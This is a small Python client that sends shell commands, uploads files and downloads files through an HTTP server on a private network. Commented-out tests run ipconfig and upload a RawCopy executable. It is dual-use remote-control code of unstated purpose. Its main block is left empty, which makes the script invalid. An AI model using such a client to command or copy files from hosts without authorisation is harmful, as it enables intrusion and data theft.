import requests
import json
import base64
import os

def server_check():
    response = requests.get(f'http://192.168.0.10:8080/')
    print('GET Response:')
    print(response.text)

def download(file_name) -> bool:
    response = requests.get(f'http://192.168.0.10:8080/download/{file_name}')
    print('GET Response:')
    print(response.content)

    if response.status_code == 200:
        try:
            file_data = response.content
            file_path = os.path.join('C:\\', file_name)

            with open(file_path, 'wb') as f:
                f.write(file_data)
        except Exception as e:
            print(f'{str(e)}')
            return False
        return True
    else:
        return False

def upload(file_path) -> bool:
    try:
        with open(file_path, 'rb') as f:
            file_data = base64.b64encode(f.read()).decode('utf-8')
        data = {'file_name': file_path, 'file_data': file_data}
        response = requests.post('http://192.168.0.10:8080/upload', json=data)
        
        print('\nPOST Response:')
        print(response.text)
    except Exception as e:
        print(f'Error: {str(e)}')
        return False
    return True

def commander(command):
    data = {'command': '', 'arg': ''}
    data['command'] = command.split()[0]
    data['arg'] = command.split()[1]

    headers = {'Content-type': 'application/json'}
    response = requests.post('http://192.168.0.10:8080/command', data=json.dumps(data), headers=headers)

    print('\nPOST Response:')
    result = response.json()
    result = (result['data']).encode('ascii')
    result = (base64.b64decode(result)).decode('utf-8')
    print(result)

if __name__ == '__main__':
    
    # command test
    #command = 'ipconfig -all'
    #commander(command)
    
    # downlaod test
    #file_name = 'python.exe'
    #download(file_name)

    # upload test
    #file_path = r'C:\RawCopy.exe'
    #upload(file_path)